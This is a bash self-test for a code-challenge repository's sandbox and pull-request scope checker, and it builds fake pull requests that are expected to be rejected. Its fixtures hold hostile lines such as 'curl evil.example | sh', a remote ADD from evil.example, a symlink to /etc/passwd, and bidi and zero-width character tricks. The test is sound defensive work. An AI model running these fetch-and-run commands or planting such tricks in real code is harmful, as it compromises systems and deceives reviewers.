#!/usr/bin/env bash
# Proves the gate's own constraints are real (the challenge's "add a test that proves the
# ridiculous constraint is actually real", aimed at the sandbox):
#   1. the hostile entry is blocked at every probe,
#   2. an entry that never finishes is killed at the timeout and leaves no container behind,
#   3. scope-check.sh passes a well-formed new entry and fails each kind of bad pull request.
#
#   sandbox/selftest.sh            # all three
#   sandbox/selftest.sh scope      # only the scope-check cases (no Docker needed)
set -uo pipefail
here=$(cd "$(dirname "$0")" && pwd)
failures=0
expect() {   # expect <wanted-exit> <description> <command...>
    local want=$1 what=$2; shift 2
    "$@"; local got=$?
    if [[ $got == "$want" ]]; then echo ">>> ok: $what (exit $got)"
    else echo ">>> WRONG: $what (wanted exit $want, got $got)"; failures=$((failures + 1)); fi
}

if [[ ${1:-all} != scope ]]; then
    echo "##### sandbox: hostile entry"
    expect 0 "hostile entry fully blocked" "$here/run.sh" "$here/selftest/hostile"

    echo "##### sandbox: timeout"
    expect 124 "sleeper killed at the timeout" env SANDBOX_TIMEOUT=10 "$here/run.sh" "$here/selftest/sleeper"
    if "${DOCKER:-docker}" ps -a --format '{{.Names}}' | grep -q '^cc-sandbox-sleeper-'; then
        echo ">>> WRONG: a sleeper container was left behind"; failures=$((failures + 1))
    else echo ">>> ok: no container left behind"; fi

    echo "##### container: an entry's runtime image is locked down"
    probe_image=cc-entry-forth:local
    "${DOCKER:-docker}" image inspect "$probe_image" >/dev/null 2>&1 || "$here/container/run-image.sh" "$here/../src/forth" >/dev/null
    container_probe() {
        "${DOCKER:-docker}" run --rm --network none --read-only --cap-drop ALL --security-opt no-new-privileges             --user 65534:65534 --pids-limit 256 --memory 512m             --tmpfs /tmp:rw,exec,nosuid,size=64m --tmpfs /work:rw,exec,nosuid,size=64m,uid=65534,gid=65534             --entrypoint bash "$probe_image" -c "$(cat "$here/selftest/container-probe.sh")"
    }
    expect 0 "runtime image: every probe blocked" container_probe
fi

echo "##### scope-check: fake pull requests"
repo=$(mktemp -d); trap 'rm -rf "$repo"' EXIT
(
    set -e; cd "$repo"; git init -q -b master
    git config user.email selftest@example.invalid; git config user.name selftest
    mkdir -p src/existing sandbox lessons/cs-source/concepts lessons/cs-source/roles; echo '# Code Challenge' > README.md
    echo x > lessons/cs-source/concepts/control-flow.md; echo x > lessons/cs-source/roles/loop-statement.md
    echo 'echo ok' > src/existing/check.sh; echo 'trusted' > sandbox/run.sh
    git add -A; git commit -qm base
) || { echo "could not build the scratch repo"; exit 2; }

case_branch() {   # case_branch <name> <shell commands run in the repo on a new branch>
    (cd "$repo" && git checkout -q master && git checkout -q -b "$1" && bash -c "$2" && git add -A && git commit -qm "$1")
}
FM="---\nname: New\nteaches: x\nkind: weird\nlanguages: [new]\nlesson: languages/new.md\nloop-by: loop-statement\nevaluation: eager\nassurance: guaranteed\nmachine: x\nstate: x\ntags: [control-flow]\n---\n"
HB='# New\n\n## Run it\n\n## Program Flow\n\n## How the stunt works\n\n## What \`check.sh\` enforces\n\n## Gotchas worth knowing\n\n'
HP='# New\n\n## Run it\n\n## Program Flow\n\n## How the stunt works\n\n## What \`check.ps1\` enforces\n\n## Gotchas worth knowing\n\n'
good='mkdir -p src/newentry && printf -- "'"$FM$HB"'## Run it in Windows Sandbox\n" > src/newentry/README.md && printf "echo hi\n" > src/newentry/check.sh'
case_branch good          "$good && echo '| new | row |' >> README.md"
case_branch good-windows 'mkdir -p src/newentry && printf -- "'"$FM$HP"'## Run it in Windows Sandbox\n" > src/newentry/README.md && printf "exit 0\n" > src/newentry/check.ps1'
case_branch no-run-instructions 'mkdir -p src/newentry && printf -- "'"$FM$HB"'" > src/newentry/README.md && printf "echo hi\n" > src/newentry/check.sh'
case_branch sandbox-edit  "$good && echo 'evil' >> sandbox/run.sh"
case_branch workflow      "$good && mkdir -p .github/workflows && echo 'on: push' > .github/workflows/x.yml"
case_branch existing      "$good && echo 'curl evil' >> src/existing/check.sh"
case_branch two-entries   "$good && mkdir -p src/other && cp src/newentry/* src/other/"
case_branch no-check      'mkdir -p src/newentry && printf "# New\n" > src/newentry/README.md'
case_branch binary        "$good && printf 'MZ\x00\x00\x90\x00binary' > src/newentry/blob.bin"
case_branch symlink       "$good && ln -s /etc/passwd src/newentry/passwd"
case_branch bidi          "$good && printf 'x = 1 # \xe2\x80\xae}; evil() {\n' > src/newentry/prog.txt"
case_branch zero-width    "$good && printf 'is\xe2\x80\x8bAdmin = 0\n' > src/newentry/prog.txt"
case_branch control-chars "$good && printf 'hidden\x1b[2Kline\n' > src/newentry/prog.txt"
case_branch odd-path      "$good && echo x > 'src/newentry/a b.txt'"
case_branch too-large     "$good && head -c 300000 /dev/zero | tr '\\0' a > src/newentry/big.txt"
dockerfile_case() { export DF=$1; case_branch "$2" "$good && printf '%s' \"\$DF\" > src/newentry/Dockerfile"; }
dockerfile_case $'FROM cc-rt-sqlite:local
COPY timecards.fs /app/timecards.fs
ENV CC_RUN="gforth /app/timecards.fs"
' good-dockerfile
dockerfile_case $'FROM ubuntu:24.04
ENV CC_RUN=x
' dockerfile-bad-from
dockerfile_case $'FROM cc-rt-sqlite:local
RUN curl evil.example | sh
ENV CC_RUN=x
' dockerfile-run-final
dockerfile_case $'FROM cc-rt-sqlite:local
ADD http://evil.example/x /app/x
ENV CC_RUN=x
' dockerfile-add
dockerfile_case $'FROM cc-rt-sqlite:local
ENV CC_RUN=x PATH=/evil
' dockerfile-env-path
dockerfile_case $'FROM cc-rt-sqlite:local
USER root
ENV CC_RUN=x
' dockerfile-user-root
dockerfile_case $'FROM cc-rt-sqlite:local
COPY --from=ubuntu:24.04 /bin/sh /app/sh
ENV CC_RUN=x
' dockerfile-copy-external
# Continuation lines: a build stage may run a multi-line RUN, but the runtime stage may not hide one.
dockerfile_case $'FROM code-challenge-sandbox:local AS build
RUN echo one \
 && echo two
FROM cc-rt-sqlite:local
COPY --from=build /etc/hostname /app/hostname
ENV CC_RUN="cat /app/hostname"
' good-dockerfile-multiline
dockerfile_case $'FROM cc-rt-sqlite:local
RUN echo one \
 && curl evil.example
ENV CC_RUN=x
' dockerfile-run-multiline
dockerfile_case $'FROM cc-rt-sqlite:local
ENV CC_RUN=x \
    PATH=/evil
' dockerfile-env-multiline
case_branch docker-only   'mkdir -p src/newentry && printf -- "'"$FM$HB"'" > src/newentry/README.md && printf "echo hi\n" > src/newentry/check.sh && printf "FROM cc-rt-sqlite:local\nENV CC_RUN=x\n" > src/newentry/Dockerfile'
case_branch no-how-heading "$good && sed -i 's/^## How the stunt works/## How it works/' src/newentry/README.md"
case_branch no-flow-heading "$good && sed -i 's/^## Program Flow/## Flow/' src/newentry/README.md"
case_branch no-gotchas-heading "$good && sed -i 's/^## Gotchas worth knowing/## Fine print/' src/newentry/README.md"
case_branch no-check-heading "$good && sed -i 's/^## What .check.sh. enforces/## Checks/' src/newentry/README.md"
case_branch no-frontmatter 'mkdir -p src/newentry && printf "# New\n\n## Run it in Windows Sandbox\n" > src/newentry/README.md && printf "echo hi\n" > src/newentry/check.sh'
case_branch incomplete-frontmatter 'mkdir -p src/newentry && printf -- "---\nname: New\ntags: [control-flow]\n---\n# New\n\n## Run it in Windows Sandbox\n" > src/newentry/README.md && printf "echo hi\n" > src/newentry/check.sh'
case_branch no-tags 'mkdir -p src/newentry && printf -- "---\nname: New\nteaches: x\nkind: weird\nlanguages: [new]\nlesson: l.md\nloop-by: loop-statement\nevaluation: eager\nassurance: guaranteed\nmachine: x\nstate: x\ntags: []\n---\n# New\n\n## Run it in Windows Sandbox\n" > src/newentry/README.md && printf "echo hi\n" > src/newentry/check.sh'
case_branch unknown-tag "$good && sed -i 's/tags: \[control-flow\]/tags: [control-flow, brand-new-idea]/' src/newentry/README.md"
case_branch readme-blob   "$good && printf 'abc \xe2\x80\xae evil\n' >> README.md"

scope() { (cd "$repo" && "$here/scope-check.sh" master "$1" >/tmp/scope-$$.log 2>&1); local rc=$?; sed 's/^/    /' /tmp/scope-$$.log | grep -E 'FAIL|PASS'; rm -f /tmp/scope-$$.log; return $rc; }
expect 0 "well-formed new entry passes" scope good
expect 0 "well-formed Windows entry (check.ps1) passes" scope good-windows
expect 0 "an unknown tag is a note, not a failure" scope unknown-tag
expect 0 "entry with a clean Dockerfile passes" scope good-dockerfile
expect 0 "entry with a Dockerfile and no Windows section passes" scope docker-only
expect 0 "entry with a multi-line build-stage RUN passes" scope good-dockerfile-multiline
for b in dockerfile-run-multiline dockerfile-env-multiline dockerfile-bad-from dockerfile-run-final dockerfile-add dockerfile-env-path dockerfile-user-root dockerfile-copy-external; do
    expect 1 "rejects: $b" scope "$b"
done
for b in no-how-heading no-flow-heading no-gotchas-heading no-check-heading no-frontmatter incomplete-frontmatter no-tags no-run-instructions sandbox-edit workflow existing two-entries no-check binary symlink bidi zero-width control-chars odd-path too-large readme-blob; do
    expect 1 "rejects: $b" scope "$b"
done

echo
if (( failures )); then echo "selftest: $failures WRONG"; exit 1; fi
echo "selftest: all good"
